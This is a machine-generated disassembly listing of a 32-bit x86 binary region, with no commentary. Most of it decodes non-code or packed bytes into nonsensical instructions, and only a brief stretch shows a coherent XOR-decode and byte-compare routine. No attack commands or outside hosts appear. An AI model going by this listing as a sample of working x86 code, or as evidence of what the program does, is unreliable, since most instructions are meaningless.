  4145b9:	add    DWORD PTR [edi],ebp
  4145bb:	mov    edi,0x596c78bd
  4145c0:	mov    ch,0x77
  4145c2:	ins    BYTE PTR es:[edi],dx
  4145c3:	loope  0x414557
  4145c5:	inc    ebx
  4145c6:	add    dl,BYTE PTR [edx-0x6e]
  4145c9:	gs out 0xb3,al
  4145cc:	mov    eax,0x1211670d
  4145d1:	cld    
  4145d2:	dec    esi
  4145d3:	jmp    0x9bf3:0x7d012ef1
  4145da:	xchg   edx,eax
  4145db:	inc    ecx
  4145dc:	xchg   BYTE PTR [ecx-0x36125c9e],bh
  4145e2:	dec    ebp
  4145e3:	mov    ebp,0x304c5446
  4145e8:	retf   
  4145e9:	mov    ah,0x32
  4145eb:	mov    eax,ds:0xd6b11f22
  4145f0:	mov    esp,0xe5308f9b
  4145f5:	shr    dh,1
  4145f7:	rcl    BYTE PTR [ecx],1
  4145f9:	xlat   BYTE PTR ds:[ebx]
  4145fa:	and    BYTE PTR [ebx+0x5a1508db],bl
  414600:	cld    
  414601:	imul   eax,edx,0xc20d3a17
  414607:	scas   al,BYTE PTR es:[edi]
  414608:	cmp    BYTE PTR [esp+edi*2-0x36],cl
  41460c:	in     eax,dx
  41460d:	sub    BYTE PTR [edx+0x34b338a3],al
  414613:	lahf   
  414614:	xor    al,0xf2
  414616:	clc    
  414617:	out    dx,eax
  414618:	mov    BYTE PTR [ecx-0x7914372b],cl
  41461e:	fwait
  41461f:	pop    eax
  414620:	pop    edi
  414621:	fistp  WORD PTR [ebx]
  414623:	mov    bh,0x7d
  414625:	mov    WORD PTR [ecx+0x5c],?
  414628:	mov    edx,0xac972cc5
  41462d:	mov    esi,0x72b0624d
  414632:	sub    BYTE PTR [edx],ch
  414634:	ja     0x414613
  414636:	push   0xffffffc3
  414638:	cmp    edi,DWORD PTR [ebx-0x4411e2ca]
  41463e:	pop    edi
  41463f:	mov    bl,0x6b
  414641:	adc    eax,0x8f5ea30f
  414646:	sbb    al,0x19
  414648:	call   0x9cfff019
  41464d:	jns    0x4145f6
  41464f:	enter  0x2f85,0xc8
  414653:	in     eax,0x64
  414655:	mov    ebp,0xcfd285e8
  41465a:	adc    ch,BYTE PTR [esi+eiz*2-0x51]
  41465e:	test   BYTE PTR [ecx+0x195e8331],0xf1
  414665:	(bad)  
  414666:	fcomip st,st(7)
  414668:	push   esi
  414669:	mov    eax,0x9ee870c0
  41466e:	inc    ecx
  41466f:	js     0x414670
  414671:	in     al,0x9a
  414673:	daa    
  414674:	mov    cl,0x48
  414676:	stos   DWORD PTR es:[edi],eax
  414677:	jle    0x414697
  414679:	int3   
  41467a:	push   ecx
  41467b:	test   al,0x6f
  41467d:	and    eax,0x2106ebc4
  414682:	sub    ecx,0x42
  414685:	out    0x1e,eax
  414687:	xchg   edi,eax
  414688:	jl     0x41463a
  41468a:	inc    ebx
  41468b:	push   ss
  41468c:	mov    dl,0xa0
  41468e:	mov    edi,0xfd5ab331
  414693:	sar    BYTE PTR [eax-0x779f6120],1
  414699:	mov    edi,0x6d81d167
  41469e:	call   0xe76d5e1b
  4146a3:	scas   eax,DWORD PTR es:[edi]
  4146a4:	adc    bl,ch
  4146a6:	in     al,dx
  4146a7:	mov    DWORD PTR [esp+ebx*1],0xb272f4bd
  4146ae:	out    0xd9,eax
  4146b0:	cmc    
  4146b1:	sar    DWORD PTR [ebp+edx*4-0x71780fa4],0xd5
  4146b9:	cmp    al,0x9b
  4146bb:	mov    ebx,0xe105aebe
  4146c0:	aam    0x3a
  4146c2:	push   0xda47f07e
  4146c7:	cmp    cl,bh
  4146c9:	fs sahf 
  4146cb:	(bad)  
  4146cd:	sbb    al,0x81
  4146cf:	or     ch,ch
  4146d1:	test   DWORD PTR gs:[bx+0x60],edx
  4146d6:	es jb  0x4146aa
  4146d9:	inc    ebx
  4146da:	dec    esi
  4146db:	mov    WORD PTR [eax-0x510a7a63],?
  4146e1:	inc    edx
  4146e2:	mov    cl,0x2
  4146e4:	ror    ebx,0x80
  4146e7:	mov    ch,0xa7
  4146e9:	aad    0x4a
  4146eb:	pusha  
  4146ec:	(bad)  
  4146ee:	xchg   esp,eax
  4146ef:	pop    ebp
  4146f0:	fdiv   DWORD PTR [ebp+0x20214cd4]
  4146f6:	arpl   WORD PTR [eax],cx
  4146f8:	clc    
  4146f9:	dec    ecx
  4146fa:	repz icebp 
  4146fc:	nop
  4146fd:	jns    0x4146ab
  4146ff:	fistp  QWORD PTR [esi]
  414701:	shr    DWORD PTR [edi-0x60],1
  414704:	loop   0x4146b8
  414706:	jmp    0xab126921
  41470b:	xor    DWORD PTR [esi],eax
  41470d:	imul   esp,DWORD PTR [ebp*4+0x231328e],0x3289e9ff
  414718:	leave  
  414719:	ficomp WORD PTR [eax+0x79]
  41471c:	jmp    0x534f:0x366fc26c
  414723:	js     0x41473a
  414725:	jae    0x41472c
  414727:	jne    0x414755
  414729:	cmp    eax,0xbb5681f1
  41472e:	retf   0xfc0b
  414731:	mov    al,ds:0x8f636c15
  414736:	lods   al,BYTE PTR ds:[esi]
  414737:	mov    WORD PTR [edx],gs
  414739:	sub    eax,0x6a36c86e
  41473e:	outs   dx,DWORD PTR ds:[esi]
  41473f:	shl    al,cl
  414741:	lods   eax,DWORD PTR ds:[esi]
  414742:	lock jbe 0x414741
  414745:	jge    0x4146e7
  414747:	xchg   esi,eax
  414748:	inc    esi
  414749:	outs   dx,DWORD PTR ds:[esi]
  41474a:	in     al,dx
  41474b:	retf   0x332e
  41474e:	sub    edx,DWORD PTR [ecx-0x25]
  414751:	ss xchg esp,eax
  414753:	pop    ebp
  414754:	push   DWORD PTR [eax+0x47cdd227]
  41475a:	(bad)  
  41475b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41475c:	aaa    
  41475d:	adc    BYTE PTR [ebx+0x68f4fe2],dl
  414763:	sahf   
  414764:	jo     0x41472a
  414766:	mov    eax,ds:0x85acd2ce
  41476b:	psubsw mm2,QWORD PTR [ecx]
  41476e:	adc    ah,BYTE PTR [ecx+0x2d]
  414771:	and    BYTE PTR [edi-0x22],dl
  414774:	call   0xec131d36
  414779:	jmp    0x41476c
  41477b:	js     0x4147b9
  41477d:	mov    edi,DWORD PTR [ecx-0x5f8c7956]
  414783:	aaa    
  414784:	ja     0x414780
  414786:	sub    al,0x10
  414788:	repnz (bad) 
  41478b:	rcl    BYTE PTR [ebx+0x7],0x19
  41478f:	inc    edx
  414790:	mov    ch,0x26
  414792:	mov    DWORD PTR [ebx+edx*8+0x1],edx
  414796:	nop
  414797:	mov    edi,DWORD PTR es:[edx]
  41479a:	(bad)  
  41479c:	(bad)  
  41479e:	push   cs
  41479f:	div    edx
  4147a1:	(bad)  
  4147a2:	out    dx,al
  4147a3:	pop    es
  4147a4:	xchg   esp,eax
  4147a5:	ror    ebp,cl
  4147a7:	jge    0x41477b
  4147a9:	sahf   
  4147aa:	or     ebp,DWORD PTR ds:0x3159b574
  4147b0:	push   ds
  4147b1:	xor    esp,DWORD PTR [ebx]
  4147b3:	popa   
  4147b4:	jnp    0x414778
  4147b6:	js     0x41473a
  4147b8:	fmul   DWORD PTR [edi]
  4147ba:	dec    ecx
  4147bb:	sub    DWORD PTR [ebx],0x428eb60
  4147c1:	retf   
  4147c2:	xchg   esi,eax
  4147c3:	mov    BYTE PTR [edi],bh
  4147c5:	repz inc eax
  4147c7:	std    
  4147c8:	mov    ebx,0x7f17e39d
  4147cd:	fwait
  4147ce:	xchg   bh,dl
  4147d0:	rol    DWORD PTR [eax+eiz*8-0x5c],0x3a
  4147d5:	call   0x88ab:0xa8836f79
  4147dc:	pop    esp
  4147dd:	aas    
  4147de:	fild   WORD PTR [edx-0x7ad6d0af]
  4147e4:	mov    edx,0x2a53259f
  4147e9:	punpckhwd mm6,mm1
  4147ec:	out    dx,eax
  4147ed:	jno    0x4147d8
  4147ef:	or     DWORD PTR [ecx+eiz*2-0x50],edi
  4147f3:	push   ds
  4147f4:	and    ebx,DWORD PTR [ebx]
  4147f6:	jmp    0x8211a4c7
  4147fb:	jmp    0x6f098380
  414800:	dec    eax
  414801:	xchg   ebp,eax
  414802:	mov    esi,0xdac3b9a3
  414807:	fsubr  st(1),st
  414809:	dec    esi
  41480a:	mul    ch
  41480c:	sub    edx,DWORD PTR [ebx+0x48f86807]
  414812:	sbb    al,0x5
  414814:	retf   0x50da
  414817:	inc    eax
  414818:	(bad)  
  414819:	push   ecx
  41481a:	or     bh,BYTE PTR [ebp+0xcb8f95]
  414820:	daa    
  414821:	lahf   
  414822:	mov    ?,WORD PTR [ebx+0x5c4deacb]
  414828:	gs push ebx
  41482a:	ror    ebp,0x66
  41482d:	jg     0x4147f3
  41482f:	ins    DWORD PTR es:[edi],dx
  414830:	jl     0x4147d8
  414832:	or     edi,DWORD PTR [esi+edx*4]
  414835:	mov    ds:0xf85b5a4a,al
  41483a:	xchg   ebx,eax
  41483b:	ret    
  41483c:	pop    ecx
  41483d:	iret   
  41483e:	leave  
  41483f:	cs xor eax,0x3115f7d3
  414845:	xchg   esi,eax
  414846:	(bad)  
  414847:	dec    bx
  414849:	test   al,0x9f
  41484b:	fstp   QWORD PTR [edx]
  41484d:	inc    edi
  41484e:	lods   al,BYTE PTR ds:[esi]
  41484f:	mov    ch,0x34
  414851:	inc    DWORD PTR [edx]
  414853:	inc    ebx
  414854:	pusha  
  414855:	les    esp,FWORD PTR [ebx+0x36]
  414858:	cmp    ebp,DWORD PTR [ebx]
  41485a:	fisubr WORD PTR [edi]
  41485c:	mov    ah,0x16
  41485e:	sbb    bl,BYTE PTR [edx]
  414860:	jl     0x41481d
  414862:	repnz xchg ebp,eax
  414864:	mov    esp,DWORD PTR [edx+eiz*4+0x470681c4]
  41486b:	and    ebx,DWORD PTR ds:0x90b7375f
  414871:	mov    ds:0x6cb8fd50,eax
  414876:	fs and al,0x91
  414879:	mov    ebp,0xc0da5d98
  41487e:	jle    0x414881
  414880:	ret    0xd9f8
  414883:	mov    edx,0xfb5a459e
  414888:	arpl   WORD PTR [esi+0x7f],si
  41488b:	xor    eax,0xf61373c4
  414890:	ds out 0xcd,al
  414893:	sub    al,0xcd
  414895:	xlat   BYTE PTR ds:[ebx]
  414896:	ffreep st(3)
  414898:	mov    ds:0x66d7d429,eax
  41489d:	mov    ds:0x682cf91a,al
  4148a2:	adc    al,0xd7
  4148a4:	jge    0x414910
  4148a6:	mov    ds:0xb24af6c9,eax
  4148ab:	test   BYTE PTR [ebp-0xf745f8f],bl
  4148b1:	nop
  4148b2:	pop    ss
  4148b3:	inc    edx
  4148b4:	and    al,0x8b
  4148b6:	push   ebp
  4148b7:	or     BYTE PTR [ebx],dh
  4148b9:	rol    BYTE PTR [ebx],1
  4148bb:	(bad)  
  4148bc:	jne    0x4124e5
  4148c2:	mov    edx,DWORD PTR [ebp-0xc]
  4148c5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148cc:	mov    bl,BYTE PTR [ebp-0x1]
  4148cf:	cmp    dl,bl
  4148d1:	je     0x416d0f
  4148d7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148da:	mov    edx,DWORD PTR [ebp-0xc]
  4148dd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148e4:	mov    ebx,DWORD PTR [ebp+0xc]
  4148e7:	xor    ecx,eax
  4148e9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f5]
  4148f0:	jne    0x4191a3
  4148f6:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148f9:	mov    edx,DWORD PTR [ebp+0xc]
  4148fc:	xor    ecx,eax
  4148fe:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f5]
  414906:	mov    edx,DWORD PTR [ebp-0x18]
  414909:	xor    edx,eax
  41490b:	add    edx,esi
  41490d:	cmp    ecx,edx
  41490f:	mov    ecx,DWORD PTR [ebp-0x14]
  414912:	mov    DWORD PTR [ebp+0x8],ecx
  414915:	mov    ecx,DWORD PTR [ebp+0x8]
  414918:	je     0x41b60b
  41491e:	xor    ecx,eax
  414920:	add    ecx,esi
  414922:	mov    ecx,0x242ebf1
  414927:	je     0x416d97
  41492d:	mov    edx,DWORD PTR [ebp+0x8]
  414930:	jmp    0x416c90
  414935:	jo     0x414954
  414937:	cmc    
  414938:	dec    eax
  414939:	or     BYTE PTR [eax-0x4213ea36],0xb0
  414940:	sub    eax,0xd98a9ecb
  414945:	mov    ecx,0x3e838069
  41494a:	pop    esi
  41494b:	add    DWORD PTR [ebx+0x3c244aaa],0x41
  414952:	je     0x41498b
  414954:	lods   al,BYTE PTR ds:[esi]
  414955:	enter  0xb958,0xa9
  414959:	aad    0xc0
  41495b:	adc    eax,0xa33c865f
  414960:	bound  ebx,QWORD PTR [esi-0x2c]
  414963:	cwde   
  414964:	out    0x76,eax
  414966:	jmp    0x48976ba9
  41496b:	ja     0x4149b5
  41496d:	lods   eax,DWORD PTR ds:[esi]
  41496e:	push   es
  41496f:	pop    ebp
  414970:	loope  0x414907
  414972:	fs scas al,BYTE PTR es:[edi]
  414974:	adc    ecx,ecx
  414976:	aad    0xa
  414978:	sub    BYTE PTR [esi+0x3cdd5074],dh
  41497e:	jno    0x41494a
  414980:	int3   
  414981:	fs adc eax,0x385821c4
  414987:	dec    esi
  414988:	loopne 0x414968
  41498a:	nop
  41498b:	repz sub bl,dl
  41498e:	mov    eax,0x99ad717a
  414993:	test   eax,esp
  414995:	call   0xbc53:0x51f7ba8f
  41499c:	pop    ecx
  41499d:	push   esp
  41499e:	inc    esp
  41499f:	and    eax,0x285c87af
  4149a4:	jge    0x4149c4
  4149a6:	pop    ebp
  4149a7:	mov    al,0x8e
  4149a9:	sub    edx,DWORD PTR [ecx+0x28]
  4149ac:	jns    0x4149f9
  4149ae:	lods   eax,DWORD PTR ds:[esi]
  4149af:	mov    bh,0x37
  4149b1:	mov    ebx,0xa13a7add
  4149b6:	pop    ebp
  4149b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149b8:	cmp    DWORD PTR [ebx+0x67f98ac9],esp
  4149be:	push   edx
  4149bf:	jns    0x414a24
  4149c1:	popa   
  4149c2:	pop    ecx
  4149c3:	xchg   ebx,eax
  4149c4:	outs   dx,BYTE PTR ds:[esi]
  4149c5:	cmp    ebx,ebp
  4149c7:	mov    eax,0xf5ffa545
  4149cc:	push   edx
  4149cd:	jmp    0x27c5728c
  4149d2:	inc    edx
  4149d3:	(bad)  
  4149d4:	aad    0xea
  4149d6:	inc    ebx
  4149d7:	pop    ss
  4149d8:	aad    0x96
  4149da:	rol    edx,0x68
  4149dd:	dec    edx
  4149de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149e0:	add    bh,dl
  4149e2:	jmp    0xab6d:0x27a03114
  4149e9:	mov    dl,0xf8
  4149eb:	test   DWORD PTR [edi+0x1b],eax
  4149ee:	xchg   ebp,eax
  4149ef:	fdivp  st(7),st
  4149f1:	xchg   DWORD PTR [eax-0x20],edx
  4149f4:	ins    DWORD PTR es:[edi],dx
  4149f5:	lahf   
  4149f6:	push   ecx
  4149f7:	mov    esp,0x12f44047
  4149fc:	out    0x37,eax
  4149fe:	out    dx,eax
  4149ff:	xchg   edx,eax
  414a00:	gs mov cl,0x9e
  414a03:	jmp    0x80a7d8c1
  414a08:	out    dx,eax
  414a09:	push   0x70d07906
  414a0e:	rcl    ah,0xf
  414a11:	cdq    
  414a12:	das    
  414a13:	jae    0x414a54
  414a15:	mov    ch,0x5b
  414a17:	adc    bh,ah
  414a19:	jne    0x414a75
  414a1b:	jo     0x4149fc
  414a1d:	mov    ah,0x55
  414a1f:	push   ss
  414a20:	test   DWORD PTR [edx+0x2cdc2f3e],esi
  414a26:	mov    edi,0xf52faacd
  414a2b:	xchg   edi,eax
  414a2c:	repz cmp DWORD PTR [eax],esp
  414a2f:	aas    
  414a30:	push   es
  414a31:	sbb    DWORD PTR [edi-0x62],esp
  414a34:	mov    esi,0x5e487cd5
  414a39:	and    eax,0xeb34dc4c
  414a3e:	jnp    0x414a22
  414a40:	or     ebp,esi
  414a42:	pop    ebx
  414a43:	push   eax
  414a44:	sbb    BYTE PTR [edi+0x15],al
  414a47:	inc    ebx
  414a48:	jmp    0xf132e843
  414a4d:	pop    ds
  414a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a4f:	sub    DWORD PTR [ecx],0xe
  414a52:	inc    esp
  414a53:	xor    eax,0x72b58f10
  414a58:	add    edx,DWORD PTR [esi]
  414a5a:	jbe    0x414a5f
  414a5c:	push   ss
  414a5d:	pop    edi
  414a5e:	mov    esp,0x8eed6082
  414a63:	stc    
  414a64:	clc    
  414a65:	loope  0x414a67
  414a67:	sbb    DWORD PTR [edx],ecx
  414a69:	cmc    
  414a6a:	push   esi
  414a6b:	aam    0x90
  414a6d:	push   esp
  414a6e:	leave  
  414a6f:	sub    BYTE PTR [eax],0xee
  414a72:	add    dh,bl
  414a74:	mov    ds:0xfde0b2e0,eax
  414a79:	push   ds
  414a7a:	nop
  414a7b:	fdivr  QWORD PTR [ecx]
  414a7d:	sub    BYTE PTR [edx-0x70],bh
  414a80:	or     ch,cl
  414a82:	xlat   BYTE PTR ds:[ebx]
  414a83:	jne    0x414af1
  414a85:	ds jge 0x414a6b
  414a88:	mov    ah,0x53
  414a8a:	pop    ebx
  414a8b:	lock cmp dl,cl
  414a8e:	adc    eax,DWORD PTR [eax-0x16e91895]
  414a94:	loopne 0x414af2
  414a96:	or     al,0x56
  414a98:	je     0x414a5f
  414a9a:	or     eax,DWORD PTR [edi-0x36]
  414a9d:	jp     0x1e72f661
  414aa3:	adc    eax,0x6ce31559
  414aa8:	jbe    0x414a9e
  414aaa:	cmp    edx,esi
  414aac:	fwait
  414aad:	das    
  414aae:	xchg   edx,eax
  414aaf:	rcr    DWORD PTR [eax-0x53],0xb7
  414ab3:	mov    ah,0x25
  414ab5:	fldl2e 
  414ab7:	scas   eax,DWORD PTR es:[edi]
  414ab8:	pop    edi
  414ab9:	push   cs
  414aba:	jl     0x414aaa
  414abc:	xlat   BYTE PTR ds:[ebx]
  414abd:	popa   
  414abe:	test   al,0x4e
  414ac0:	test   DWORD PTR [ebp-0x44af9747],esp
  414ac6:	mov    edx,0xff162d45
  414acb:	sbb    eax,0xb62605c0
  414ad0:	test   ecx,ecx
  414ad2:	xchg   ecx,eax
  414ad3:	jno    0x414b44
  414ad5:	daa    
  414ad6:	pop    esp
  414ad7:	pushf  
  414ad8:	pop    esp
  414ad9:	ja     0x414a99
  414adb:	mov    dh,bh
  414add:	out    0xa0,al
  414adf:	mov    esp,0xce160ce7
  414ae4:	call   0x4664daaf
  414ae9:	in     eax,0xe
  414aeb:	add    ch,BYTE PTR [edx]
  414aed:	fwait
  414aee:	add    ebx,0xffffffd5
  414af1:	sti    
  414af2:	sti    
  414af3:	frstor [eax-0x36]
  414af6:	push   0xffffff94
  414af8:	sub    ah,BYTE PTR ds:0xf07b36a0
  414afe:	mov    ds:0xc5b7622f,eax
  414b03:	push   es
  414b04:	in     al,0x89
  414b06:	push   ebx
  414b07:	shr    dl,1
  414b09:	in     al,0xbc
  414b0b:	rcr    DWORD PTR [esi+0x1fd73ae6],cl
  414b11:	das    
  414b12:	int3   
  414b13:	push   ss
  414b14:	xchg   esi,eax
  414b15:	pop    edi
  414b16:	mov    ds:0x4cff4e32,eax
  414b1b:	jo     0x414b70
  414b1d:	clc    
  414b1e:	push   esi
  414b1f:	sub    edx,DWORD PTR [esi+ecx*4+0x50422646]
  414b26:	cld    
  414b27:	xor    DWORD PTR [ebx+eiz*8+0x1d004264],edi
  414b2e:	cmp    DWORD PTR [ebx+eiz*8],0xa9e142c4
  414b35:	rcl    dh,cl
  414b37:	sbb    al,0x93
  414b39:	mov    bh,0xa7
  414b3b:	add    eax,0xf6804145
  414b40:	add    eax,0xb08162c5
  414b45:	int3   
  414b46:	clc    
  414b47:	(bad)  
  414b49:	jl     0x414ad6
  414b4b:	sub    eax,0x837f0f34
  414b50:	mov    eax,ds:0x4502aa56
  414b55:	cmp    BYTE PTR [edi+ebx*4-0x14152ab],0x55
  414b5d:	xor    DWORD PTR [eax+0xa2ea764],0x610e7502
  414b67:	cmp    eax,0x491fa566
  414b6c:	in     al,0x1f
  414b6e:	fs ja  0x414b85
  414b71:	cmc    
  414b72:	ja     0x414bec
  414b74:	jl     0x414bdb
  414b76:	movhps xmm6,QWORD PTR [ebx+0x4ad04555]
  414b7d:	jg     0x414b83
  414b7f:	cmp    dh,BYTE PTR [eax]
  414b81:	add    ah,BYTE PTR [ebp-0x114e8e9c]
  414b87:	jb     0x414bb7
  414b89:	iret   
  414b8a:	jle    0x414bf5
  414b8c:	push   ecx
  414b8d:	ds pusha 
  414b8f:	in     eax,dx
  414b90:	vpacksswb xmm3,xmm4,XMMWORD PTR [ebx]
  414b94:	shr    DWORD PTR [edx+0x65],cl
  414b97:	aas    
  414b98:	adc    DWORD PTR [ecx],eax
  414b9a:	xchg   ebp,eax
  414b9b:	out    0x66,al
  414b9d:	loop   0x414b51
  414b9f:	cmp    DWORD PTR ds:0xb49626b9,0xb272b285
  414ba9:	js     0x414c12
  414bab:	aaa    
  414bac:	test   ebp,esi
  414bae:	jb     0x414bae
  414bb0:	pop    eax
  414bb1:	xchg   DWORD PTR [edx],edi
  414bb3:	add    esp,DWORD PTR [edx+0x3f]
  414bb6:	popf   
  414bb7:	in     eax,0xce
  414bb9:	scas   al,BYTE PTR es:[edi]
  414bba:	imul   ebp,esp,0xe3b1ec8b
  414bc0:	jmp    0x414c32
  414bc2:	imul   eax,DWORD PTR [edi-0x7a8bab6f],0x4f874fb8
  414bcc:	out    0x79,eax
  414bce:	xchg   ecx,eax
  414bcf:	push   ebx
  414bd0:	pop    ss
  414bd1:	clc    
  414bd2:	nop
  414bd3:	loop   0x414ba4
  414bd5:	xchg   edx,eax
  414bd6:	dec    ecx
  414bd7:	cmp    al,0x91
  414bd9:	icebp  
  414bda:	or     al,0xe
  414bdc:	ficomp DWORD PTR [eax+0x6e14f21b]
  414be2:	mov    eax,0x66928b99
  414be7:	mov    ecx,0x64a0e7b
  414bec:	js     0x414bd6
  414bee:	add    al,0xe
  414bf0:	cmp    BYTE PTR [esi],bl
  414bf2:	cmp    eax,0x9d565f1a
  414bf7:	xor    al,0x93
  414bf9:	nop
  414bfa:	aad    0x61
  414bfc:	dec    ecx
  414bfd:	xchg   DWORD PTR [edi-0x59d506cc],ebp
  414c03:	into   
  414c04:	fadd   QWORD PTR [ebx+0x4472eaa7]
  414c0a:	mov    bh,0xcf
  414c0c:	or     edx,DWORD PTR [ecx-0x4a]
  414c0f:	xchg   edx,eax
  414c10:	leave  
  414c11:	div    esp
  414c13:	lahf   
  414c14:	sub    eax,0x8ece470c
  414c19:	push   edx
  414c1a:	pop    eax
  414c1b:	sub    edi,edi
  414c1d:	sahf   
  414c1e:	int3   
  414c1f:	inc    esi
  414c20:	call   0x4c36:0xc115861c
  414c27:	cmp    cl,bh
  414c29:	cmp    esp,0x24248d5e
  414c2f:	icebp  
  414c30:	scas   al,BYTE PTR es:[edi]
  414c31:	or     eax,0x37dac8a0
  414c36:	mov    dh,0x6c
  414c38:	pop    edi
  414c39:	xor    al,0x2
  414c3b:	pusha  
  414c3c:	mov    ah,0x60
  414c3e:	pushf  
  414c3f:	(bad)  
  414c42:	bound  edi,QWORD PTR [ebx-0x4c9b4a25]
  414c48:	and    eax,0x82070a39
  414c4d:	mov    ds:0xa4dc569a,eax
  414c52:	mov    ds:0xc3372832,al
  414c57:	sbb    DWORD PTR [esi],ecx
  414c59:	cmc    
  414c5a:	scas   al,BYTE PTR es:[edi]
  414c5b:	add    DWORD PTR ds:0x27ae46fc,ecx
  414c61:	xchg   cl,al
  414c63:	stc    
  414c64:	into   
  414c65:	mov    ds:0xd6d65260,eax
  414c6a:	hlt    
  414c6b:	pop    eax
  414c6c:	inc    ecx
  414c6d:	jecxz  0x414c1a
  414c6f:	cmp    ebx,esi
  414c71:	out    dx,al
  414c72:	mov    esp,0x1f9d8776
  414c77:	jmp    0x414cdc
  414c79:	jecxz  0x414c12
  414c7b:	test   al,0xd2
  414c7d:	sub    al,0x3
  414c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c80:	test   DWORD PTR [ecx-0x48],ebp
  414c83:	imul   DWORD PTR ds:0xc52d5d88
  414c89:	repz inc eax
  414c8b:	push   esp
  414c8c:	scas   al,BYTE PTR es:[edi]
  414c8d:	and    dl,BYTE PTR [esi-0x2efba56d]
  414c93:	or     DWORD PTR [ebx],edx
  414c95:	sbb    ecx,DWORD PTR [esi+0x7e]
  414c98:	jns    0x414d14
  414c9a:	je     0x414c1f
  414c9c:	fsub   QWORD PTR [esi+0x46]
  414c9f:	les    edx,FWORD PTR [ebx-0x5ff48c1f]
  414ca5:	cwde   
  414ca6:	add    DWORD PTR ds:0xd3584559,esp
  414cac:	cli    
  414cad:	and    DWORD PTR [edi],ecx
  414caf:	cmp    esi,DWORD PTR [ebx-0x3d4cc16d]
  414cb5:	mov    ecx,0xae39e8a7
  414cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cbb:	call   0x88184c4d
  414cc0:	addr16 cmc 
  414cc2:	jnp    0x414d05
  414cc4:	jns    0x414c5f
  414cc6:	addr16 pop ss
  414cc8:	iret   
  414cc9:	add    ecx,DWORD PTR [ecx-0x41]
  414ccc:	test   cl,0x3
  414ccf:	adc    eax,0xdaeb819
  414cd4:	xchg   BYTE PTR [esi+0x2b58816f],dh
  414cda:	std    
  414cdb:	sub    BYTE PTR es:[esp+eax*2-0x3d9afec0],ah
  414ce3:	test   eax,ebp
  414ce5:	lods   eax,DWORD PTR ds:[esi]
  414ce6:	add    BYTE PTR [edx-0xe64771],bl
  414cec:	mov    ebx,0x2e86834c
  414cf1:	popf   
  414cf2:	cmp    al,0x7b
  414cf4:	pushf  
  414cf5:	ror    ebp,1
  414cf7:	mov    esi,0xced0003c
  414cfc:	sub    DWORD PTR [edx+0x5b],ebp
  414cff:	rcr    BYTE PTR [edx],cl
  414d01:	retf   0x4781
  414d04:	xchg   BYTE PTR [edi],dl
  414d06:	mov    ds:0x16941c9a,eax
  414d0b:	test   BYTE PTR [edi+0x1929b7ed],dl
  414d11:	call   0xf768:0x5d0f0b24
  414d18:	sub    BYTE PTR [esi+0x15],bh
  414d1b:	das    
  414d1c:	adc    eax,0x9635c2c4
  414d21:	xor    al,0x1e
  414d23:	or     cl,BYTE PTR [ebx]
  414d25:	xor    BYTE PTR [ebx+0x42],al
  414d28:	mov    eax,ds:0xbb56ea5f
  414d2d:	mov    bl,0xdb
  414d2f:	sub    ebp,esi
  414d31:	inc    ecx
  414d32:	add    bh,BYTE PTR [edi+0x16]
  414d35:	jbe    0x414d53
  414d37:	mov    es:0x494b6017,eax
  414d3d:	ss mov ah,0x60
  414d40:	xor    al,dh
  414d42:	jg     0x414dbf
  414d44:	arpl   ax,si
  414d46:	dec    DWORD PTR [edi-0x12ca6378]
  414d4c:	shl    ebp,0x25
  414d4f:	mov    BYTE PTR [ebp+edx*1+0x332b1fee],dl
  414d56:	inc    esp
  414d57:	out    0x1c,eax
  414d59:	sub    al,0xb8
  414d5b:	mov    al,ds:0x5678bf88
  414d60:	adc    al,BYTE PTR [edx]
  414d62:	lds    eax,FWORD PTR [ebx+0x71]
  414d65:	adc    eax,0xef3ab961
  414d6a:	push   0x69fb0ddf
  414d6f:	out    0x70,eax
  414d71:	inc    ebp
  414d72:	mov    WORD PTR [ebx],?
  414d74:	pop    edi
  414d75:	mov    es,WORD PTR [eax+esi*8]
  414d78:	push   edx
  414d79:	mov    eax,0x924f79a0
  414d7e:	adc    BYTE PTR [ebp+0x20],0x7
  414d82:	xchg   edx,eax
  414d83:	jo     0x414d2e
  414d85:	hlt    
  414d86:	inc    esi
  414d87:	pop    ss
  414d88:	cdq    
  414d89:	(bad)  [eax]
  414d8b:	into   
  414d8c:	into   
  414d8d:	stos   DWORD PTR es:[edi],eax
  414d8e:	repz adc BYTE PTR [edx-0x6c],dl
  414d92:	xchg   edi,eax
  414d93:	jbe    0x414d36
  414d95:	cmc    
  414d96:	dec    edi
  414d97:	mov    esp,0x8494d679
  414d9c:	loopne 0x414dcb
  414d9e:	std    
  414d9f:	mov    al,ds:0x100f3a29
  414da4:	adc    eax,0x4d95bca4
  414da9:	jmp    0xcf7a:0x55b2f80f
  414db0:	pop    ebx
  414db1:	inc    eax
  414db2:	(bad)  
  414db4:	outs   dx,BYTE PTR ds:[esi]
  414db5:	enter  0xfabd,0x63
  414db9:	inc    eax
  414dba:	dec    ebx
  414dbb:	outs   dx,DWORD PTR ds:[esi]
  414dbc:	push   ebp
  414dbd:	or     al,0xe6
  414dbf:	jns    0x414dc3
  414dc1:	fs dec esi
  414dc3:	mov    bh,0x0
  414dc5:	ret    
  414dc6:	pop    es
  414dc7:	sub    BYTE PTR [ecx-0x1d1c7592],0xf3
  414dce:	iret   
  414dcf:	adc    DWORD PTR [edi],esp
  414dd1:	push   edx
  414dd2:	dec    ebx
  414dd3:	mov    al,ds:0x32de3ef1
  414dd8:	scas   al,BYTE PTR es:[edi]
  414dd9:	lahf   
  414dda:	mov    DWORD PTR [esi+0x6f8927c1],esp
  414de0:	loopne 0x414df8
  414de2:	enter  0x30d5,0x18
  414de6:	adc    esi,DWORD PTR [esi]
  414de8:	xlat   BYTE PTR ds:[ebx]
  414de9:	mov    ds:0xaa801ba9,al
  414dee:	mov    ds:0x83c6375b,al
  414df3:	xchg   ecx,eax
  414df5:	sbb    eax,0xbe10c8cb
  414dfa:	lahf   
